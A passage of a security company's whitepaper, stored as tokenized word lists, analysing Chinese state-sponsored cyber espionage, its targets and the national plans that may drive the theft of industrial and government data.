"contextis.com"], ["5", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["may", "be", "suffering", "from", "similar", "attacks", ".", "There", "is", "also", "a", "widespread", "lack", "of", "understanding", "of"], ["targeted", "attacks", "among", "IT", "staff", ",", "a", "lack", "of", "dedicated", "IT", "security", "personnel", "and", ",", "sometimes", "as"], ["a", "consequence", "of", "IT", "functions", "being", "outsourced", ",", "an", "over-reliance", "on", "traditional", "security"], ["products", "such", "as", "anti-virus", "and", "firewalls", "\u2013", "both", "of", "which", "are", "ineffective", "against", "even", "lower"], ["end", "targeted", "attacks", ".", "The", "pressure", "exerted", "on", "IT", "staff", "from", "the", "business", "is", "primarily"], ["concerned", "with", "service", "uptime", "and", "availability", "rather", "than", "security;", "and", "budgets", "for", "even"], ["routine", "security", "operations", "such", "as", "penetration", "testing", "are", "under", "constant", "pressure", ".", "It", "is", "a"], ["sad", "fact", "that", ",", "for", "many", "businesses", ",", "money", "for", "IT", "security", "only", "becomes", "available", "once", "a"], ["serious", "problem", "has", "been", "identified", ",", "by", "which", "time", "it", "is", "often", "too", "late", "."], ["One", "more", "common", "problem", "in", "private", "sector", "companies", "is", "that", "some", "managers", "take", "the"], ["attitude", "that", "they", "would", "prefer", "not", "to", "know", "about", "security", "problems", ".", "Information"], ["Technology", "departments", "may", "worry", "that", "commissioning", "a", "detection", "exercise", "to", "find"], ["compromised", "hosts", "in", "their", "environment", ",", "could", "reveal", "a", "series", "of", "attacks", "and", "the", "theft", "of"], ["data", ",", "which", "might", "not", "be", "good", "for", "their", "career", "prospects", ".", "Higher", "up", "the", "management"], ["chain", ",", "board", "members", "may", "even", "choose", "not", "to", "spend", "money", "on", "security", "on", "the", "grounds"], ["that", "this", "will", "affect", "profitability", "and", "perhaps", "the", "size", "of", "their", "salaries", "or", "bonuses", ".", "They", "may"], ["instead", "prefer", "to", "postpone", "any", "major", "spending", "on", "security", "until", "they", "absolutely", "have", "to", "."], ["Why", "Cyber", "?"], ["Clearly", ",", "the", "Chinese", "government", "is", "keen", "to", "understand", "the", "political", "decisions", "taken", "by", "other"], ["countries", "and", "the", "activities", "of", "opposition", "groups", "within", "China", ",", "so", "it", "is", "hardly", "surprising", "that", "it"], ["orchestrates", "the", "compromise", "of", "computers", "via", "emailed", "Trojan", "attachments", "or", "links", "to"], ["compromised", "websites", "on", "a", "large", "scale", ".", "This", "is", "nothing", "new;", "just", "traditional", "espionage", "with", "a"], ["new", "methodology", "."], ["Until", "recently", "China", ",", "like", "most", "other", "developed", "countries", ",", "would", "have", "hand-picked"], ["intelligence", "officers", "from", "universities", "and", "the", "military", ",", "trained", "them", "in", "the", "arts", "of", "developing"], ["relationships", ",", "recruiting", "agents", "and", "how", "to", "covertly", "gather", "information", "to", "pass", "back", "to"], ["Beijing", ".", "They", "would", "have", "been", "deployed", "to", "embassies", "overseas", "or", "under", "a", "business", "cover", "."], ["The", "arrival", "of", "the", "Internet", "did", "not", "sound", "the", "death", "knell", "for", "human", "spying", ",", "it", "simply", "offered"], ["an", "attractive", "alternative", ".", "Moving", "espionage", "operations", "into", "the", "virtual", "world", "brings", "some"], ["advantages", ".", "Firstly", ",", "it", "does", "not", "require", "anyone", "to", "be", "sent", "overseas", ".", "This", "is", "an", "important"], ["change", "for", "the", "governments", "of", "communist", "countries", ",", "naturally", "suspicious", "of", "the", "long", "term"], ["intentions", "of", "even", "their", "most", "trusted", "officials", ".", "It", "means", "there", "is", "less", "need", "to", "invest", "in", "lengthy"], ["training", "processes", ".", "Instead", ",", "hacking", "operations", "can", "be", "broken", "down", "into", "simple", "tasks", "and"], ["partly", "automated", "to", "minimise", "the", "need", "for", "operators", "with", "advanced", "technical", "skills", "."], ["Conducting", "these", "operations", "is", "cheap", "and", "carries", "a", "lesser", "risk", "than", "human", "espionage:", "even"], ["if", "the", "target", "is", "fairly", "certain", "as", "to", "the", "origin", "of", "an", "attack", ",", "the", "sponsoring", "government", "can"], ["claim", "to", "be", "a", "victim", "of", "mistaken", "identity", "or", "of", "a", "western", "conspiracy", "."], ["But", "the", "key", "benefit", "of", "this", "type", "of", "espionage", "is", "that", "any", "piece", "of", "information", "stored"], ["anywhere", "in", "the", "world", "on", "a", "computer", "or", "a", "network", "connected", "to", "the", "Internet", "is", "only", "a", "few"], ["clicks", "away", "from", "being", "stolen", ".", "There", "are", "even", "attacks", "that", "are", "designed", "to", "jump", "to"], ["computers", "not", "connected", "to", "the", "Internet", ".", "If", "the", "prize", "is", "great", "enough", "and", "the", "attacker", "is"], ["determined", "enough", ",", "there", "is", "always", "a", "way", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["6", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["How", "Cyber", "?"], ["This", "paper", "is", "not", "concerned", "with", "\u2018how\u2019", "the", "attacks", "happen", ",", "which", "is", "a", "subject", "for", "a", "white"], ["paper", "in", "its", "own", "right", ".", "Typically", "however", ",", "the", "attackers", "target", "the", "desktops", "and", "laptops", "of"], ["the", "victim\u2019s", "organisation", "and", "send", "emails", "with", "an", "attachment", "containing", "an", "exploit", ",", "(often"], ["an", "Adobe", "PDF", "or", "Microsoft", "Office", "document)", "that", "is", "targeted", "at", "one", "person", ".", "Once", "the"], ["victim", "opens", "the", "attachment", "the", "exploit", "executes", ",", "typically", "downloading", "and", "automatically"], ["installing", "a", "Trojan", ",", "which", "the", "attacker", "can", "then", "use", "to", "access", "the", "victim\u2019s", "system", ".", "The"], ["attackers", "also", "utilise", "website", "vulnerabilities", "which", "exploit", "vulnerabilities", "in", "web", "browsers", "such"], ["as", "Internet", "Explorer", "or", "Firefox", "to", "download", "malicious", "code", "onto", "a", "machine", "when", "a", "user"], ["clicks", "on", "a", "link", "in", "an", "email", ".", "Once", "the", "attacker", "has", "this", "foothold", "on", "the", "network", ",", "they"], ["typically", "look", "to", "download", "and", "use", "further", "hacking", "tools", "to", "escalate", "privileges", "to", "gain"], ["administrative", "access", "to", "key", "internal", "servers", "such", "as", "Domain", "Controllers", "or", "File", "Servers", ".", "Once"], ["achieved", ",", "the", "attackers", "typically", "use", "another", "remote", "desktop", "or", "laptop", "on", "the", "network", "to"], ["collate", "the", "data", "stolen", "and", "exfilitrate", "it", "to", "their", "remote", "servers", "."], ["In", "the", "case", "that", "a", "network", "is", "fully", "patched", "and", "constitutes", "a", "hard", "target", ",", "the", "attackers", "can"], ["respond", "and", "raise", "their", "game", "substantially", ".", "This", "could", "include", "exploiting", "a", "zero", "day"], ["vulnerability6", "or", "employing", "other", "means", "of", "installing", "an", "implant", ",", "such", "as", "using", "physical"], ["access", "to", "introduce", "an", "attack", "or", "even", "attacking", "a", "supply", "chain", "."], ["The", "Targets"], ["Despite", "opening", "up", "greatly", "over", "the", "last", "15", "years", ",", "China", "is", "still", "very", "much", "run", "by", "the"], ["Communist", "Party", ".", "The", "Party", "has", "control", "over", "and", "involvement", "in", "every", "area", "of", "daily", "life", ",", "but"], ["despite", "the", "internal", "focus", ",", "China", "is", "careful", "to", "keep", "an", "eye", "on", "the", "outside", "world", "and", "how", "the"], ["country\u2019s", "institutions", "and", "companies", "are", "perceived", "by", "foreign", "governments", ".", "An"], ["understanding", "of", "other", "countries\u2019", "political", "positions", "on", "key", "issues", "that", "affect", "China", "is", "key", "to"], ["forward", "planning", ",", "especially", "for", "an", "economy", "built", "on", "cheap", "exports", "."], ["The", "governments", "in", "which", "the", "Chinese", "state", "is", "most", "interested", "fall", "into", "three", "groups:", "its"], ["nearest", "neighbours:", "Japan", ",", "Taiwan", ",", "the", "disputed", "(semi-autonomous)", "Tibet", ",", "Mongolia", "and"], ["the", "Muslim", "\u2018Stans\u2019", "to", "the", "west;", "other", "powerful", "states", "with", "international", "influence", "such", "as", "the"], ["US", ",", "Russia", ",", "the", "UK", ",", "Germany", ",", "France", "and", "India;", "and", "finally", "states", "with", "strong", "economic", "links"], ["to", "China", "including", "Brazil", ",", "Iran", ",", "Australia", ",", "parts", "of", "Africa", "and", "Southeast", "Asia", "."], ["Whilst", "China", "will", "not", "be", "interested", "in", "the", "entire", "spectrum", "of", "government", "affairs", "in", "each", "of"], ["these", "countries", ",", "there", "will", "be", "some", "interest", "in", "some", "parts", "of", "all", "these", "governments\u2019", "activities", "."], ["Gathering", "information", "on", "this", "scale", "is", "a", "massive", "task:", "monitoring", "relevant", "issues", ",", "identifying"], ["individuals", "with", "access", "to", "that", "information", "and", "crafting", "attacks", "in", "the", "appropriate", "form", "and"], ["language", "."], ["The", "other", "constant", "preoccupation", "of", "the", "Chinese", "government", "is", "the", "maintenance", "of"], ["internal", "and", "external", "security", ".", "The", "enemies", "of", "the", "internal", "state", "are", "referred", "to", "as", "the", "\u2018Five"], ["Poisons\u2019:", "the", "separatist", "Uighurs", "(a", "mainly", "Muslim", "group", "in", "Northeast", "China)", ",", "Tibetan"], ["separatists", ",", "pro-democracy", "supporters", ",", "supporters", "of", "an", "independent", "Taiwan", "and", "followers"], ["of", "the", "religious", "group", "Falun", "Gong", ".", "Keeping", "tabs", "on", "these", "groups", "and", "on", "their", "known"], ["supporters", "at", "home", "and", "overseas", "is", "another", "huge", "task", ".", "The", "Ministry", "of", "State", "Security", "monitors"], ["6"], ["A", "zero", "day", "vulnerability", "is", "one", "which", "is", "not", "publicly", "known", "and", "for", "which", "no", "patch", "exists", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["7", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["the", "communications", "between", "individuals", "and", "groups", ",", "a", "task", "made", "considerably", "easier"], ["through", "the", "deployment", "of", "Trojans", "to", "compromise", "computer", "equipment", ".", "As", "a", "minimum", ","], ["security", "services", "would", "usually", "seek", "to", "steal", "email", "account", "login", "and", "password", "details", "in"], ["order", "to", "be", "able", "to", "log", "in", "remotely", "and", "read", "emails", ".", "Google", "has", "confirmed", "this", "activity", "was"], ["taking", "place", "on", "the", "Gmail", "accounts", "of", "Chinese", "dissidents", ".", "7"], ["China", "wants", "a", "clear", "picture", "of", "other", "countries\u2019", "military", "activities", "in", "order", "to", "inform", "its", "own"], ["tactical", "and", "strategic", "decisions", ".", "Human", "penetrations", "of", "foreign", "military", "organisations", "are"], ["extremely", "difficult", "and", "carry", "significant", "risks", ",", "so", "relatively", "passive", "email", "attacks", "are", "an"], ["excellent", "substitute", "activity", ",", "where", "no", "single", "incident", "can", "be", "seen", "as", "an", "act", "of", "aggression"], ["meriting", "a", "military", "response", ".", "It", "remains", "to", "be", "seen", "whether", "thousands", "of", "attacks", "conducted"], ["over", "a", "long", "period", "of", "time", "will", "come", "to", "be", "regarded", "as", "having", "been", "a", "provocative", "act"], ["warranting", "a", "military", "response", "."], ["While", "China", "has", "been", "publicly", "\u2013", "albeit", "mostly", "not", "directly", "\u2013", "accused", "of", "carrying", "out", "attacks"], ["against", "governments", ",", "military", "organisations", "and", "military", "contractors", "numerous", "times", ",", "there"], ["are", "also", "plenty", "of", "examples", "of", "private", "sector", "organisations", "being", "targeted", ".", "Several", "stand"], ["out", "from", "the", "last", "few", "years:", "the", "\u2018Aurora8\u2019", "attacks", "that", "hit", "Google", ",", "Adobe", ",", "Juniper", ",", "Northrup"], ["Grumman", "and", "others;", "the", "McAfee-dubbed", "\u2018Night", "Dragon9\u2019", "attacks", "that", "struck", "companies"], ["around", "the", "world", "in", "the", "energy", "sector;", "and", "the", "\u2018Shady", "RAT", "10\u2019", "attacks", "that", "affected", "the", "steel"], ["industry", ",", "heavy", "engineering", ",", "construction", "and", "communications", "companies", "and", "others", "."], ["Interestingly", ",", "despite", "reporting", "on", "the", "intrusions", ",", "McAfee", "does", "not", "highlight", "the", "fact", "that", "antivirus", "software", "did", "little", "to", "stop", "the", "attacks", "in", "the", "first", "place", ".", "In", "all", "likelihood", "all", "these", "various"], ["\u2018operations\u2019", "formed", "part", "of", "the", "same", "attack", ",", "with", "different", "groups", "or", "military", "units", "carrying"], ["out", "operations", "sponsored", "by", "the", "Chinese", "state", ".", "One", "attack", "that", "was", "clearly", "carefully"], ["planned", ",", "and", "equally", "linked", "to", "the", "others", ",", "was", "that", "conducted", "against", "RSA11", ",", "whereby"], ["attackers", "stole", "information", "which", "allowed", "them", "to", "replicate", "the", "SecurID", "tokens", "used", "by"], ["companies", "to", "authenticate", "individuals", "logging", "onto", "their", "networks", "from", "remote", "locations", "."], ["Armed", "with", "those", "stolen", "credentials", ",", "an", "attacker", "would", "be", "able", "to", "log", "in", "to", "company"], ["networks", "as", "if", "a", "real", "user", ".", "The", "full", "extent", "of", "this", "breach", "has", "not", "been", "publicly", "disclosed", ","], ["though", "we", "do", "know", "that", "Lockheed", "Martin", "was", "attacked", "and", "we", "can", "speculate", "that", "other"], ["defence", "contractors", "were", "also", "targeted", ".", "As", "full", "details", "of", "what", "was", "stolen", "have", "never", "been"], ["put", "into", "the", "public", "domain", ",", "we", "can", "only", "guess", "at", "the", "targeted", "information", ".", "Google", "claimed"], ["Intellectual", "Property", "had", "been", "stolen", ",", "though", "no", "further", "details", "were", "given", ".", "But", "these"], ["companies", "were", "all", "targeted", "for", "a", "reason", ".", "Data", "was", "identified", "that", "would", "somehow", "be", "of"], ["use", "to", "China", ".", "We", "will", "look", "at", "who", "laid", "out", "the", "requirements", "for", "this", "data", "next", "."], ["7"], ["http://googleblog", ".", "blogspot.com/2010/01/new-approach-to-china.html"], ["8", "http://en", ".", "wikipedia.org/wiki/Operation_Aurora"], ["9", "http://www", ".", "mcafee.com/ca/resources/white-papers/wp-global-energy-cyberattacks-"], ["night-dragon", ".", "pdf"], ["10", "http://www", ".", "mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf"], ["11"], ["http://www", ".", "rsa.com/node.aspx?id=3872"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["8", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["The", "Requirements"], ["We", "should", "never", "think", "of", "Chinese", "cyber", "attacks", "as"], ["uncoordinated", ",", "random", "or", "indiscriminate", ".", "They", "target"], ["companies", ",", "governments", "or", "individuals", "because", "a", "specific"], ["requirement", "has", "been", "identified", ".", "Context", "has", "studied", "a"], ["number", "of", "Chinese", "government", "policies", ",", "documents", "and"], ["stated", "aspirations", ",", "as", "well", "as", "Chinese", "commercial", "structures", ","], ["which", "may", "show", "why", "targets", "may", "have", "been", "picked;", "and"], ["may", "also", "help", "companies", "to", "gauge", "whether", "their", "business"], ["should", "consider", "itself", "to", "be", "at", "risk", "of", "being", "targeted", "by", "a"], ["Chinese", "attacker", "."], ["The", "key", "documents", "are", "the", "Five", "Year", "Plan", "and", "the", "National"], ["Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development", ".", "We"], ["will", "also", "theorise", "around", "the", "(unwritten)", "intelligence"], ["requirements", ".", "We", "will", "then", "later", "investigate", "China\u2019s", "state-owned", "enterprises", "as", "potential"], ["generators", "of", "requests", "for", "material", "to", "be", "stolen", "via", "targeted", "attacks;", "and", "as", "consumers", "of"], ["stolen", "data", "."], ["The", "Five", "Year", "Plan", "is", "a", "series", "of", "development", "initiatives", ",", "both", "social", "and", "economic", ",", "that", "set"], ["high", "level", "goals", "for", "where", "the", "Communist", "Party", "would", "like", "to", "see", "the", "country", "in", "five", "years\u2019"], ["time", ".", "The", "latest", "Plan", "was", "finalised", "in", "October", "2010", "and", "applies", "to", "the", "period", "2011", "\u2013", "2015", ".", "It"], ["contains", "goals", "for", "urbanisation", "rates", "and", "targets", "for", "economic", "growth;", "details", "the", "foreign"], ["industries", "that", "will", "be", "invited", "to", "do", "business", "in", "China", ",", "the", "scale", "of", "proposed", "construction"], ["projects", "and", "areas", "of", "the", "country/economy", "where", "further", "development", "should", "be"], ["encouraged", ".", "These", "high", "level", "goals", "filter", "down", "to", "all", "government", "departments", "at", "national", ","], ["regional", "and", "local", "level", ",", "where", "individual", "initiatives", "are", "managed", ".", "But", "the", "plan", "also", "hints", "at"], ["the", "areas", "where", "China", "feels", "it", "needs", "to", "concentrate", "its", "efforts", ",", "or", "where", "it", "needs", "to", "catch", "up"], ["with", "other", "countries", "elsewhere", "in", "the", "world", "."], ["However", ",", "targeted", "attacks", "are", "\u2018state", "sponsored\u2019", ",", "which", "means", "that", "it", "is", "not", "the", "government"], ["that", "conducts", "the", "attack", ",", "but", "departments", "of", "the", "state", "or", "affiliated", "groups", ".", "When", "the"], ["government", "decides", "that", ",", "for", "example", ",", "it", "requires", "intelligence", "relating", "to", "US", "military"], ["operations", "in", "Afghanistan", ",", "different", "parts", "of", "the", "state", "intelligence", "apparatus", "will", "respond", "to"], ["this", "requirement", ",", "each", "bringing", "different", "skill", "sets", "to", "bear", "on", "the", "problem", "of", "finding", "the"], ["required", "information", ".", "For", "example", ",", "the", "People\u2019s", "Liberation", "Army", "(PLA)", "has", "departments", "with"], ["access", "to", "satellite", "photography", ",", "which", "could", "provide", "information", "on", "troop", "movements", "."], ["Another", "department", "may", "have", "access", "to", "Signals", "Intelligence", "(SIGINT)", ",", "which", "intercepts"], ["communications", ".", "Chinese", "diplomats", "in", "the", "country", "will", "speak", "with", "their", "Afghan", "counterparts"], ["about", "the", "situation", ",", "while", "intelligence", "officers", ",", "perhaps", "in", "diplomatic", "or", "even", "non-official"], ["roles", ",", "are", "able", "to", "exploit", "human", "agents", "with", "access", "to", "useful", "reporting", ".", "To", "complement", "all", "of"], ["these", "sources", ",", "cyber", "attacks", "can", "be", "used", "against", "a", "variety", "of", "targets", "such", "as", "the", "Pentagon", ","], ["military", "forces", "in", "theatre", ",", "the", "US", "embassy", ",", "defence", "contractors", "and", "representatives", "of", "the"], ["UN", "and", "NATO", ".", "As", "cyber", "proves", "its", "worth", "(if", "it", "hasn\u2019t", "already)", "other", "parts", "of", "the", "government"], ["will", "seek", "to", "develop", "their", "own", "cyber", "capability", "to", "add", "to", "their", "existing", "capabilities", ",", "not"], ["wishing", "to", "be", "outshone", "by", "competing", "departments", "."], ["One", "of", "the", "points", "on", "the", "Five", "Year", "Plan", "for", "instance", "is", "\u2018More", "efficient", "development", "of"], ["nuclear", "power", "under", "the", "precondition", "of", "ensured", "safety\u2019", ",", "which", "could", "suggest", "that", "any"], ["information", "gathering", "attacks", "against", "the", "nuclear", "energy", "industry", "(as", "opposed", "to", "sabotage"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["9", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["or", "Stuxnet12", "style", "attacks)", "could", "be", "carried", "out", "with", "the", "express", "intention", "of", "supporting", "this"], ["part", "of", "the", "Plan", "."], ["The", "attacks", "could", "be", "directed", "against", "nuclear", "plants", "themselves", "in", "an", "attempt", "to", "obtain"], ["operating", "information;", "construction", "companies", ",", "to", "steal", "building", "plans", "(which", "may", "also", "be"], ["of", "value", "to", "the", "military", "in", "case", "of", "war);", "regulatory", "bodies", "for", "rules", ",", "policies", "and", "procedures;"], ["and", "any", "of", "the", "hundreds", "of", "companies", "that", "build", "parts", "for", "the", "plant", "or", "develop", "technology"], ["used", "in", "the", "nuclear", "process", "."], ["In", "terms", "of", "who", "could", "be", "carrying", "out", "the", "attacks", ",", "we", "have", "to", "consider", "not", "only", "the", "military"], ["(the", "Third", "Department", "of", "the", "PLA", "has", "the", "remit", "for", "cyber", "operations", ",", "though", "other", "areas", "are"], ["likely", "to", "have", "some", "capability", "too)", ",", "but", "also", "nuclear", "construction", "companies", ",", "the"], ["government", "department", "with", "a", "remit", "for", "the", "energy", "industry", ",", "or", "any", "of", "the", "hacking", "groups"], ["that", "are", "closely", "affiliated", "to", "the", "state", ".", "Different", "campaigns", "may", "even", "be", "competing", "to", "steal"], ["the", "same", "information", "with", "the", "rewards", "going", "to", "the", "attackers", "who", "get", "it", "first", "."], ["The", "Plan", "also", "advocates", "the", "development", "of", "high-end", "manufacturing", ",", "hi-tech", "industry", ","], ["modern", "agriculture", ",", "high-speed", "rail", "and", "hydropower", ".", "The", "Plan", "does", "not", "explain", "in", "any", "detail"], ["how", "this", "development", "will", "be", "achieved", ",", "although", "in", "some", "cases", "it", "does", "specify", "that", "certain"], ["areas", "will", "be", "prioritised", "for", "direct", "foreign", "investment", ".", "In", "these", "cases", ",", "foreign", "firms", "are", "invited"], ["to", "partner", "with", "local", "firms", "to", "complete", "a", "project", "and", "engage", "in", "\u2018technology", "transfer\u2019", ".", "This"], ["means", "(officially)", "that", "the", "Chinese", "company", "will", "learn", "skills", "from", "the", "foreign", "company", "and"], ["develop", "their", "own", "capabilities", "in", "the", "area", ".", "Unofficially", ",", "it", "generally", "ends", "up", "with", "the", "foreign"], ["company", "having", "its", "IP", "and", "technology", "stolen", "and", "then", "finding", "that", "it", "no", "longer", "has", "an"], ["invitation", "to", "do", "business", "in", "the", "country", "."], ["One", "good", "example", "of", "technology", "transfer", "can", "be", "seen", "in", "the", "area", "of", "high", "speed", "railways", "."], ["Originally", ",", "trains", "were", "purchased", "from", "Kawasaki", ",", "Siemens", "and", "Bombardier", "and", "these"], ["manufacturers", "helped", "create", "the", "first", "high", "speed", "lines", "which", "opened", "in", "2007", ".", "Soon"], ["afterwards", "China", "started", "to", "build", "its", "own", "high", "speed", "trains", ",", "modelled", "on", "those", "imported", ",", "but"], ["with", "reconfigured", "components", ".", "There", "is", "an", "ongoing", "legal", "case", "brought", "by", "Kawasaki", "and"], ["other", "Japanese", "companies", "relating", "to", "Chinese", "companies", "attempting", "to", "patent", "Kawasaki"], ["technology", "associated", "with", "high", "speed", "rail13", ".", "The", "current", "Chinese", "patent", "laws", "specify", "that"], ["the", "owner", "of", "a", "patent", "registered", "in", "China", "must", "be", "Chinese", "and", "that", "the", "Chinese", "holder", "will"], ["also", "be", "favoured", "over", "any", "foreign", "claim", "for", "the", "same", "technology", "."], ["In", "July", "2011", "two", "high", "speed", "trains", "collided", "near", "Wenzhou", ",", "killing", "(according", "to", "state", "media)"], ["40", "people", ".", "There", "were", "concerns", "that", "the", "trains", "contained", "stolen", "foreign", "technology", "and", "it"], ["has", "been", "suggested", "that", "this", "is", "why", "the", "wreckage", "was", "buried", "even", "before", "the", "rescue"], ["operation", "had", "been", "completed", ".", "It", "has", "also", "been", "suggested", "in", "certain", "quarters", "that", "burying"], ["the", "wreckage", "stopped", "any", "investigation", "by", "the", "manufacturers", "into", "what", "went", "wrong", "(and"], ["whether", "or", "not", "there", "was", "stolen", "technology", "present)", ".", "This", "action", "attracted", "widespread"], ["criticism", "of", "the", "government", ",", "even", "from", "some", "sources", "within", "China", "."], ["12"], ["13"], ["http://www", ".", "bbc.co.uk/news/technology-11388018"], ["http://online", ".", "wsj.com/article/SB10001424052748704814204575507353221141616.html"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["10", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Boosting", "Domestic", "Enterprise"], ["If", "the", "Five", "Year", "Plan", "is", "short", "on", "detail", ",", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T"], ["Development", "is", "not", ".", "This", "policy", "essentially", "sets", "out", "the", "requirement", "for", "\u2018Indigenous"], ["Innovation\u2019", ",", "the", "areas", "where", "China", "should", "not", "rely", "on", "western", "technology", ",", "but", "should"], ["develop", "a", "home-grown", "alternative", ".", "The", "strong", "desire", "for", "domestic", "products", "stems", "from", "two"], ["issues", ".", "Firstly", "a", "suspicion", "that", "foreign", "technology", "could", "be", "used", "covertly", "in", "ways", "for", "which", "it"], ["was", "not", "originally", "intended", "it", "would", "be", "used", "(for", "the", "benefit", "of", "the", "attacking", "country)", "."], ["Secondly", "because", "in", "order", "to", "sustain", "high", "growth", "rates", "and", "satisfy", "domestic", "consumption", "it"], ["is", "better", "if", "China", "manufactures", "products", "of", "equal", "capability", "and", "sells", "them", "to", "its", "own", "market"], ["than", "it", "is", "to", "import", "goods", "at", "high", "prices", ".", "The", "plan", "for", "Indigenous", "Innovation", "drills", "down", "into"], ["each", "of", "the", "areas", "where", "China", "wants", "to", "develop", "a", "capability", "in", "some", "detail", ",", "even", "setting"], ["out", "priorities", ".", "The", "list", "of", "eleven", "areas", "comprises:"], ["Energy", ".", "Oil", "and", "gas", "exploration", ",", "distribution", "and", "power", "grids", ",", "low", "cost", "renewable"], ["energy", ",", "coal", "liquefaction", ",", "industrial", "energy", "efficiency"], ["Water", "and", "Mineral", "Resources", ".", "Distribution", ",", "conservation", ",", "desalination", ",", "zoning", "and"], ["development", "of", "resources"], ["Environment", ".", "Pollutant", "control", "and", "recycling", ",", "restoration", "of", "vulnerable", "ecosystems", ","], ["maritime", "ecosystem", "protection", ",", "environmental", "change"], ["Agriculture", ".", "Genetic", "resource", "development", ",", "disease", "prevention", ",", "use", "of", "agro-forest"], ["biomass", ",", "multifunctional", "farming", "equipment", ",", "modern", "dairy", "industry"], ["Manufacturing", "Industry", ".", "Basic/generic", "parts/components", ",", "digital", "intelligent", "design", ","], ["recycling", "iron", "and", "steel", ",", "marine", "engineering", "technology", ",", "engineering", "processes", "for"], ["the", "defence", "industry"], ["Transportation", ".", "Construction", "and", "maintenance", "technology", ",", "high", "speed", "rail", ",", "energy"], ["efficient", "cars", ",", "traffic", "control", "systems", ",", "alternative", "fuel", "based", "cars"], ["Modern", "Service", "Industry", ".", "Next", "generation", "Internet", "technology", ",", "high", "performance"], ["computers", ",", "digital", "media", "content", "platforms", ",", "HD", "displays"], ["Population", "/", "Health", ".", "Treatment", "of", "diseases", ",", "medical", "processes"], ["Urbanisation", ".", "Green", "buildings", ",", "architectural", "energy", "efficiencies"], ["Public", "Security", ".", "Security", "warning", "systems", ",", "bio-safety", "measures"], ["Defence", ".", "[Classified]"], ["In", "addition", "to", "these", "areas", ",", "which", "already", "contain", "a", "lot", "of", "areas", "that", "targeted", "western"], ["companies", "operate", "in", ",", "there", "is", "a", "further", "list", "of", "16", "\u2018Major", "Special", "Projects\u2019", ".", "These", "projects", "are"], ["intended", "to", "add", "to", "the", "overall", "strength", "of", "China", ".", "Previous", "examples", "of", "such", "projects", "include"], ["the", "development", "of", "the", "hydrogen", "bomb", ",", "launching", "satellites", ",", "manned", "space", "flights", "and"], ["hybrid", "rice", ".", "They", "are", "intended", "also", "to", "be", "a", "source", "of", "national", "pride", ".", "If", "one", "can", "see", "the"], ["potential", "for", "cyber", "attack", "to", "enhance", "many", "of", "the", "areas", "outlined", "above", ",", "the", "list", "below"], ["gives", "even", "more", "scope", "for", "the", "targeted", "theft", "of", "data", "from", "companies", "and", "governments"], ["around", "the", "world:"], ["Core", "electronic", "components", ",", "high-end", "general", "use", "chips", "and", "basic", "software"], ["products"], ["Large-scale", "integrated", "circuit", "manufacturing", "equipment", "and", "techniques"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["11", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["New", "generation", "broadband", "wireless", "mobile", "communication", "networks"], ["Advanced", "numeric-controlled", "machinery", "and", "basic", "manufacturing", "technology"], ["Large-scale", "oil", "and", "gas", "exploration"], ["Large", "advanced", "nuclear", "reactors"], ["Water", "pollution", "control", "and", "treatment"], ["Breeding", "new", "varieties", "of", "genetically", "modified", "organisms"], ["Pharmaceutical", "innovation", "and", "development"], ["Control", "and", "treatment", "of", "AIDS", ",", "hepatitis", ",", "and", "other", "major", "diseases"], ["Large", "aircraft"], ["High-definition", "earth", "observation", "system"], ["Manned", "spaceflight", "and", "lunar", "probe", "programs"], ["Classified", "military", "projects", "(x3)"], ["If", "we", "take", "the", "Major", "Special", "Projects", "as", "a", "Chinese", "technology", "wish", "list", ",", "we", "can", "assume", "there"], ["are", "two", "different", "methods", "that", "could", "be", "used", "to", "achieve", "these", "goals", ".", "The", "first", "involves"], ["funding", "research", "programmes", "in", "universities", "and", "companies", ",", "educating", "people", "over", "the"], ["long", "term", "and", "encouraging", "a", "culture", "of", "research", ",", "development", "and", "innovation", "and", "an"], ["acceptance", "that", "achievements", "in", "some", "areas", "will", "fall", "short", "of", "expectation", "."], ["The", "second", "way", "of", "viewing", "the", "challenge", "is", "that", "much", "of", "this", "technology", "already", "exists", "in"], ["the", "rest", "of", "the", "world", ",", "is", "already", "proven", "and", "is", "(relatively)", "easy", "to", "obtain", ".", "Far", "easier", "to", "steal"], ["the", "work", "of", "others", ",", "re-engineer", "it", ",", "improve", "it", "if", "practicable", "and", "necessary", "and", "be", "seen", "to", "be"], ["contributing", "to", "the", "progression", "of", "the", "Chinese", "state;", "and", "to", "do", "so", "may", "also", "be", "personally"], ["rewarding", "for", "members", "of", "the", "Party", ".", "Failure", "to", "achieve", "these", "goals", "would", "almost", "certainly"], ["be", "seen", "as", "unacceptable", "."], ["At", "Risk"], ["The", "companies", "that", "generate", "the", "target", "information", "are", "not", "the", "only", "ones", 